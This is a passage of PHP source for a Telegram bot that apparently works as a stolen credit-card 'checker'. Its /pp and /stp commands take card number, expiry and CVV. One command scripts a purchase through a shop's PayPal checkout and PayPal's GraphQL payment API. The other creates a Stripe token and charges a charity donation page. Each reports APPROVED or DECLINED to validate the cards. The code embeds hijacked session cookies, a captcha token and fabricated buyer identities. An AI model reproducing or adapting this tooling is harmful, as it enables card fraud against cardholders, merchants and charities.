    $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: DECLINED ❌\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Charged ($20)\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: ".$proxy."\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━• 么•━━━━━━━━━━\n";
    $live = False;
} else {
    $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: GATE ERROR ❌\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Charged ($20)\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: PROXY DEAD ❌\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━•么•━━━━━━━━━━\n";
    $live = False;
}

if ($live) {
    //echo "$respuesta\n";
    editMessage($chat_id, $respuesta, $id_text);
} else {
    //echo "$respuesta\n";
    editMessage($chat_id, $respuesta, $id_text);
}

//--------FIN DEL CHECKER MERCHAND - CHARGED--------/
ob_flush();


}




elseif((strpos($message, "!pp") === 0)||(strpos($message, "/pp") === 0)||(strpos($message, ".pp") === 0)){

$lista = substr($message, 4);
$i     = explode("|", $lista);
$cc    = $i[0];
$mes   = $i[1];
$ano  = trim(substr($i[2], -2));
$ano1  = $i[2];
$cvv   = $i[3];

$bin = substr($lista, 0, 6);
$ma = "$mes/$ano1";
//$ma = "$mes+%2F+$ano";

////
$num = "$cc$mes$ano1$cvv";
//-----------------------------------------------------//
$verify = substr($cc, 16, 1);
if($verify != ""){
$respuesta = "🚫ᴄᴄ ɴᴏ ᴠᴀʟɪᴅᴀ🚫\n";
sendMessage($chat_id,$respuesta, $message_id);
die();
}

if(is_numeric($num) && $lista != '' && $cc != '' && $mes != '' && $ano != '' && $cvv != ''){
}else{
$respuesta = "━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━\n\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: /pp cc|m|y|cvv\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 2: !pp cc|m|y|cvv\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 3: .pp cc|m|y|cvv\n";
sendMessage($chat_id,$respuesta, $message_id);
die();
}


//----------------MENSAGE DE ESPERA-------------------//
$respuesta = "<b>🕒 Wait for Result...</b>";
sendMessage($chat_id,$respuesta, $message_id);
//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
$id_text = file_get_contents("ID");
//----------------------------------------------------//


$startTime = microtime(true); //TIEMPO DE INICIO
$BinData = BinData($bin); //Extrae los datos del bin
//SACA EL NONCE1/////
	
$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://dream-beat.com/checkout/',
  CURLOPT_RETURNTRANSFER => true,                           
  CURLOPT_ENCODING => '',                                 
  CURLOPT_MAXREDIRS => 10,                               
  CURLOPT_TIMEOUT => 30,                                       
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,                 
  CURLOPT_CUSTOMREQUEST => 'GET',                                
  CURLOPT_COOKIE => 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-10-14%2019%3A08%3A16%7C%7C%7Cep%3Dhttps%3A%2F%2Fdream-beat.com%2Fcart%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-10-14%2019%3A08%3A16%7C%7C%7Cep%3Dhttps%3A%2F%2Fdream-beat.com%2Fcart%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F129.0.0.0%20Mobile%20Safari%2F537.36; wordpress_logged_in_16be603727c326eebbb2512f82748386=nedisoom64%7C1730142749%7C5LhjMe9g1HVXVePM41vp5HYmRGbQHRFPOxhcNf1otoM%7Ccda8ab55c67b5ef183e12f368337d94daedfded02166c835d823aa0874d2ee4e; woodmart_wishlist_count=0; woodmart_recently_viewed_products=15622%7C15622; sbjs_session=pgs%3D12%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fdream-beat.com%2Fproduct%2Fbluetooth-sleep-and-workout-headband%2F%3Fattribute_pa_brand%3Ddream-beat%26attribute_pa_size%3Done-size%26attribute_pa_color%3Dblack; woocommerce_items_in_cart=1; woocommerce_cart_hash=9cd89d68ff2b7bc76636cfc64d097b63; wp_woocommerce_session_16be603727c326eebbb2512f82748386=74%7C%7C1729106022%7C%7C1729102422%7C%7Cdc0c153716f7127d69fb694f95d517ba',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Mobile Safari/537.36',
    'referer: https://dream-beat.com/',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);

// Expresión regular para encontrar el nonce de create_order
$patron = '/"create_order":\{"endpoint":.*?"nonce":"([a-f0-9]+)"/';
// Buscar coincidencia
preg_match($patron, $response, $coincidencia);
// Extraer valor
$nonce = $coincidencia[1];
curl_close($curl);


$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://dream-beat.com?wc-ajax=ppc-create-order',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => '{"nonce":"'.$nonce.'","payer":{"email_address":"Nedisoom64@cuvox.de","name":{"surname":"Perez","given_name":"Carlos"},"address":{"country_code":"US","address_line_1":"6195 bollinger rd","address_line_2":"","admin_area_1":"AK","admin_area_2":"New york","postal_code":"34722"},"phone":{"phone_type":"HOME","phone_number":{"national_number":"4179204022"}}},"bn_code":"Woo_PPCP","context":"checkout","order_id":"0","payment_method":"ppcp-card-button-gateway","funding_source":"card","form_encoded":"wc_order_attribution_source_type=typein&wc_order_attribution_referrer=%28none%29&wc_order_attribution_utm_campaign=%28none%29&wc_order_attribution_utm_source=%28direct%29&wc_order_attribution_utm_medium=%28none%29&wc_order_attribution_utm_content=%28none%29&wc_order_attribution_utm_id=%28none%29&wc_order_attribution_utm_term=%28none%29&wc_order_attribution_utm_source_platform=%28none%29&wc_order_attribution_utm_creative_format=%28none%29&wc_order_attribution_utm_marketing_tactic=%28none%29&wc_order_attribution_session_entry=https%3A%2F%2Fdream-beat.com%2Fcart%2F&wc_order_attribution_session_start_time=2024-10-14+19%3A08%3A16&wc_order_attribution_session_pages=13&wc_order_attribution_session_count=1&wc_order_attribution_user_agent=Mozilla%2F5.0+%28Linux%3B+Android+10%3B+K%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F129.0.0.0+Mobile+Safari%2F537.36&billing_first_name=Carlos&billing_last_name=Perez&billing_company=&billing_country=US&billing_address_1=6195+bollinger+rd&billing_address_2=&billing_city=New+york&billing_state=AK&billing_postcode=34722&billing_phone=4179204022&billing_email=Nedisoom64%40cuvox.de&ship_to_different_address=1&shipping_first_name=Carlos&shipping_last_name=Perez&shipping_company=&shipping_country=US&shipping_address_1=6195+bollinger+rd&shipping_address_2=&shipping_city=New+york&shipping_phone=4179204022&shipping_state=AZ&shipping_postcode=34722&order_comments=&shipping_method%5B0%5D=flat_rate%3A4&payment_method=ppcp-card-button-gateway&woocommerce-process-checkout-nonce=9dfdc2eb01&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&ppcp-funding-source=card","createaccount":false,"save_payment_method":false}',
  CURLOPT_COOKIE => 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-10-14%2019%3A08%3A16%7C%7C%7Cep%3Dhttps%3A%2F%2Fdream-beat.com%2Fcart%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-10-14%2019%3A08%3A16%7C%7C%7Cep%3Dhttps%3A%2F%2Fdream-beat.com%2Fcart%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F129.0.0.0%20Mobile%20Safari%2F537.36; wordpress_logged_in_16be603727c326eebbb2512f82748386=nedisoom64%7C1730142749%7C5LhjMe9g1HVXVePM41vp5HYmRGbQHRFPOxhcNf1otoM%7Ccda8ab55c67b5ef183e12f368337d94daedfded02166c835d823aa0874d2ee4e; woodmart_wishlist_count=0; woodmart_recently_viewed_products=15622%7C15622; woocommerce_items_in_cart=1; wp_woocommerce_session_16be603727c326eebbb2512f82748386=74%7C%7C1729106022%7C%7C1729102422%7C%7Cdc0c153716f7127d69fb694f95d517ba; sbjs_session=pgs%3D13%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fdream-beat.com%2Fcheckout%2F; woocommerce_cart_hash=c4886a179fb1b6412f86234f994d7bdc',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Mobile Safari/537.36',
    'Content-Type: application/json',
    'origin: https://dream-beat.com',
    'sec-fetch-dest: empty',
    'referer: https://dream-beat.com/checkout/',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
$json = json_decode($response, true);
$token = $json['data']['id'];
curl_close($curl);




//$token = "9YA37547VB014302Y";

$palabras_originales = array("TOKEN", "CC", "ANO", "CVV");
$palabras_nuevas = array($token ,$cc, $ma, $cvv);
$texto = '{"query":"\\n        mutation payWithCard(\\n            $token: String!\\n            $card: CardInput!\\n            $phoneNumber: String\\n            $firstName: String\\n            $lastName: String\\n            $shippingAddress: AddressInput\\n            $billingAddress: AddressInput\\n            $email: String\\n            $currencyConversionType: CheckoutCurrencyConversionType\\n            $installmentTerm: Int\\n            $identityDocument: IdentityDocumentInput\\n        ) {\\n            approveGuestPaymentWithCreditCard(\\n                token: $token\\n                card: $card\\n                phoneNumber: $phoneNumber\\n                firstName: $firstName\\n                lastName: $lastName\\n                email: $email\\n                shippingAddress: $shippingAddress\\n                billingAddress: $billingAddress\\n                currencyConversionType: $currencyConversionType\\n                installmentTerm: $installmentTerm\\n                identityDocument: $identityDocument\\n            ) {\\n                flags {\\n                    is3DSecureRequired\\n                }\\n                cart {\\n                    intent\\n                    cartId\\n                    buyer {\\n                        userId\\n                        auth {\\n                            accessToken\\n                        }\\n                    }\\n                    returnUrl {\\n                        href\\n                    }\\n                }\\n                paymentContingencies {\\n                    threeDomainSecure {\\n                        status\\n                        method\\n                        redirectUrl {\\n                            href\\n                        }\\n                        parameter\\n                    }\\n                }\\n            }\\n        }\\n        ","variables":{"token":"TOKEN","card":{"cardNumber":"CC","type":"VISA","expirationDate":"ANO","postalCode":"34722","securityCode":"CVV"},"firstName":"Carlos","lastName":"Perez","billingAddress":{"givenName":"Carlos","familyName":"Perez","line1":"6195 bollinger rd","line2":null,"city":"New york","state":"AK","postalCode":"34722","country":"US"},"email":"Nedisoom64@cuvox.de","currencyConversionType":"PAYPAL"},"operationName":null}';

$data = str_replace($palabras_originales, $palabras_nuevas, $texto);

//exit;
$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://www.paypal.com/graphql?fetch_credit_form_submit=',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => $data,
//  CURLOPT_COOKIE => 'ts_c=vr%3D413a95c71920a79828d514f3fd1cb6f0%26vt%3D413a95c71920a79828d514f3fd1cb6ef; rssk=d%7DC9%408%3A%3B%3C52%3D88B6%3Exqx%3EyjxA%3B%7B%7Ds%3F11; enforce_policy=ccpa; nsid=s%3A_cCf84ps2hiSaTF1hhboEd0V52nd3Jss.QG8Y5AKhLG5kcGK944%2FIRtbDm8EkW4ghdm%2FBJmOietc; KHcl0EuY7AKSMgfvHl7J5E7hPtK=zCn26v398JEvSd_Q1O-KGLzC8-6q9y1FSvEOmxuQFFLV5WN2fGuH29oVhj_bwKCyvqGQCCFIK85ONR44; sc_f=n5_FXGnLiZky8WyJSr60IOHIrq2KDEkMKgbVcDQIyaHmY9J4sGd27lToaExhi49Crc3-m_EK_eQGG9PjcrzhD4Ssx3i_GfRzOW135m; login_email=Stioness61%40teleworm.us; l7_az=dcg14.slc; LANG=es_XC%3BUS; AV894Kt2TSumQQrJwe-8mzmyREO=S23AAMr9bcZqEf9fQp-cZfP6xYVU1YzeLrPYRbVQXBjeiHwy9xiGBE1kYrLSOFIXriAD_yuTeOyoE_U8kfEOugvogwirnLtJA; tsrce=xobuyernodeserv; x-pp-s=eyJ0IjoiMTcyNzY3MTg0NTMxOCIsImwiOiIwIiwibSI6IjAifQ; ts=vreXpYrS%3D1822279845%26vteXpYrS%3D1727673645%26vr%3D413a95c71920a79828d514f3fd1cb6f0%26vt%3D413a95c71920a79828d514f3fd1cb6ef%26vtyp%3Dnew',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Mobile Safari/537.36',
    'Content-Type: application/json',
    'paypal-client-context: 18V054250E436282E',
    'x-app-name: standardcardfields',
    'sec-ch-ua-mobile: ?1',
    'paypal-client-metadata-id: 18V054250E436282E',
    'x-country: US',
    'accept-language: es-US,es;q=0.7',
    'origin: https://www.paypal.com',
    'referer: https://www.paypal.com/smart/card-fields?sessionID=uid_bb135fe1ba_mtk6mdk6nda&buttonSessionID=uid_6ac06199d2_mtk6mti6mzy&locale.x=en_US&commit=true&hasShippingCallback=false&env=production&country.x=US&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QWFIZHNiMThlRW5hLXFNcVNTRk9zV3BkTUpBMmRleUtNdTBaYlZQUXhhbUttdTE3blpJR3gyd21aMUhzQXoycFBWM0dSdDRhTWtBMHpGQ2wmY3VycmVuY3k9VVNEJmludGVncmF0aW9uLWRhdGU9MjAyNC0wNC0wMyZjb21wb25lbnRzPWJ1dHRvbnMsZnVuZGluZy1lbGlnaWJpbGl0eSZ2YXVsdD1mYWxzZSZjb21taXQ9dHJ1ZSZpbnRlbnQ9Y2FwdHVyZSZlbmFibGUtZnVuZGluZz12ZW5tbyxwYXlsYXRlciZsb2NhbGU9ZW5fVVMiLCJhdHRycyI6eyJkYXRhLXBhcnRuZXItYXR0cmlidXRpb24taWQiOiJXb29fUFBDUCIsImRhdGEtdWlkIjoidWlkX3J2dHBvbXZycGp6eHVvc2tnc3Z6amJjd25yZXd6ZiJ9fQ&disable-card=&token=18V054250E436282E',
  ],
]);



$response = curl_exec($curl);
$err = curl_error($curl);
$json = json_decode($response, true);
//$respo = $json['errors'][0]['data'][0]['code'];
//$mensaje = $json['errors'][0]['message'];
curl_close($curl);
	
// Verifica si hay errores
if (isset($json['errors'])) {

   if (isset($json['errors'][0]['data'][0]['code'])){
       $respo = $json['errors'][0]['data'][0]['code'];

   } elseif (isset($json['errors'][0]['message'])){
       $respo = $json['errors'][0]['message'];
   }

} elseif (isset($json['data']['approveGuestPaymentWithCreditCard']) && $json['data']['approveGuestPaymentWithCreditCard'] !== null) {
    // Requerimiento de 3DS
    if (isset($json['data']['approveGuestPaymentWithCreditCard']['flags']['is3DSecureRequired']) && $json['data']['approveGuestPaymentWithCreditCard']['flags']['is3DSecureRequired']) {
        $respo = "3DS authentication is required.";
    }

    // Estado del pago
    if (isset($json['data']['approveGuestPaymentWithCreditCard']['status'])) {
        if ($json['data']['approveGuestPaymentWithCreditCard']['status'] == 'approved') {
            $respo = "Pago aprobado con éxito. ID: " . $json['data']['approveGuestPaymentWithCreditCard']['id'];
        } else {
            $respo = "Pago rechazado";
        }
    }
} else {
$respo = $response;
}
	
	
$timetakeen = (microtime(true) - $startTime);
$time = substr_replace($timetakeen, '', 4);
$proxy = "LIVE ✅";



/*
if (empty($respo)) {
$respo = $response;
} else {
$respo = $respo;
}
*/

$bin = "<code>".$bin."</code>";
$lista = "<code>".$lista."</code>";


// Aquí podrías guardar $responseLog en un archivo o base de datos para depuración
if (array_in_string($respo, $live_array)) {
    $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: APPROVED ✅\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Paypal\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: ".$proxy."\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━• 么•━━━━━━━━━━\n";
    $live = True;
} elseif (strpos($respo, 'CARD_GENERIC_ERROR') !== false || strpos($respo, 'Do Not Honor') !== false || strpos($respo, 'Issuer Declined MCC') !== false || strpos($respo, 'Invalid card number') !== false || strpos($respo, 'Transaction not permitted by issuer') !== false) {
    $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: DECLINED ❌\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Paypal\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: ".$proxy."\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━• 么•━━━━━━━━━━\n";
    $live = False;
} else {
    $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: GATE ERROR ❌\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Paypal\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: PROXY DEAD ❌\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━•么•━━━━━━━━━━\n";
    $live = False;
}

if ($live) {
    //echo "$respuesta\n";
    editMessage($chat_id, $respuesta, $id_text);
} else {
    //echo "$respuesta\n";
    editMessage($chat_id, $respuesta, $id_text);
}

//--------FIN DEL CHECKER MERCHAND - CHARGED--------/
ob_flush();


}

















// Checking CC's Commands
elseif((strpos($message, "!stp") === 0)||(strpos($message, "/stp") === 0)||(strpos($message, ".stp") === 0)){

$lista = substr($message, 5);
$i     = explode("|", $lista);
$cc    = $i[0];
$mes   = $i[1];
$ano  = $i[2];
$cvv   = $i[3];
/*function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);
return $str[0];
};*/

$bin = substr($lista, 0, 6);
////
$num = "$cc$mes$ano$cvv";
//-----------------------------------------------------//
$verify = substr($cc, 16, 1);
if($verify != ""){
$respuesta = "🚫ᴄᴄ ɴᴏ ᴠᴀʟɪᴅᴀ🚫\n";
sendMessage($chat_id,$respuesta, $message_id);
die();
}

//-----------------------------------------------------//
if(is_numeric($num) && $lista != '' && $cc != '' && $mes != '' && $ano != '' && $cvv != ''){
}else{
$respuesta = "━━━━━━•⟮ɢᴀᴛᴇᴡᴀʏ sᴛʀɪᴘᴇ⟯•━━━━━━\n\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: /stp cc|m|y|cvv\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 2: !stp cc|m|y|cvv\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 3: .stp cc|m|y|cvv\n";
sendMessage($chat_id,$respuesta, $message_id);
die();
}

//----------------MENSAGE DE ESPERA-------------------//
$respuesta = "<b>🕒 Wait for Result...</b>";
sendMessage($chat_id,$respuesta, $message_id);
//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
$id_text = file_get_contents("ID");
//----------------------------------------------------//
$startTime = microtime(true); //TIEMPO DE INICIO
$BinData = BinData($bin); //Extrae los datos del bin

////RANDOM USER//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/1.2/?nat=us');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$get = curl_exec($ch);
curl_close($ch);
        preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
        $name = $matches1[1][0];
        preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
        $last = $matches1[1][0];
        preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
        $email = $matches1[1][0];
        preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
        $street = $matches1[1][0];
        preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
        $city = $matches1[1][0];
        preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
        $state = $matches1[1][0];
        preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
        $phone = $matches1[1][0];
        preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
        $postcode = $matches1[1][0];

////SACA EL TOKEN//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F3d0d0fc67%3B+stripe-js-v3%2F3d0d0fc67&time_on_page=63244&key=pk_live_41FIHoENH2ilJLW1pkGdu3wb&pasted_fields=number');
$result = curl_exec($ch);
curl_close($ch);

$token = trim(strip_tags(getstr($result,'id": "','"')));
$ip = trim(strip_tags(getstr($result,'client_ip": "','"')));
//---------------PRUEBA LAS CCS EN PAGINA DE DONACION---------------//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://goodbricksapp.com/icsd.org/donate');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'g-recaptcha-response=03ANYolqtrAXy5zIt2AjPl_v86EhHB_0O8YEgRQ73dmNp0E6rS3OaDFJqwYHwDoSLyD6Z9plsGVb3XvVAqEvqVWJTNX-YDYXAx2ynIggYNEIE5ns3byzDEIOJMghcj6qkmnzTyM4nzk3XRnSeqndz8VbvON0ctHxIbblzlqdtAwfNLKyYN3Z4QvcOqK8RmrhIJNInTgDRBAXqo8cCS3hg2xlDTbuzXSS1EV4WAlTE0yIyUVAs27f63DSS4MRZL-jX8ifTCcHmDgX3sKX92atN3k3vI91QTJ8TGmPkcuWTj4xgBnktDyFxQSIPMY2yORw5d90yIDfUHQV62ZAn3TQvZ0l_psLuVhs15xrah2ZGuA-qTBuAhAM64qn8WXaw2YCXQMG1rU4RkUeYm3PvsV0_Yxq9aBzDMC7g6aySQP-1RUw2AA6Ma7yTWvhdwL7tWcs7iy6-5fWF86dIb2tBujmSMzwfr4EdOZ1PD4Q&token='.$token.'&clientIp='.$ip.'&categoryAmount=50&paymentIterations=0&categoryName=funeral+expenses&firstName='.$name.'&lastName='.$last.'&email='.$email.'&customerEmailValidation=&phone='.$phone.'&address=true&addressStreet='.$street.'&addressApt=&addressCity='.$city.'&addressState='.$state.'&addressZipCode='.$postcode.'');
$result1 = curl_exec($ch);
curl_close($ch);
$timetakeen = (microtime(true) - $startTime);
$time = substr_replace($timetakeen, '',4);

$data = json_decode($result1, true);
	
//------------------------------------------------------------------//
$cvc_check = trim(strip_tags(getStr($result1,'"cvc_check":"','"')));
$decline_check = trim(strip_tags(getStr($result1,'"decline_code":"','"')));
//------------------------------------------------------------------//
if($cvc_check == false){
$proxy = "LIVE ✅";
}else{
$proxy = "PROXY DEAD ❌";
}

////////////////////////// [Card Response]  //////////////////////////
//$respo = trim(strip_tags(capture($result1,'"message":"',';')));
$respo = $data['status'] ?? trim(strip_tags(capture($result1,'"message":"',';')));
	
$bin = "<code>".$bin."</code>";
$lista = "<code>".$lista."</code>";


if (empty($respo)) {
        $respo = $response;
}


if (array_in_string($result1, $live_array)) {
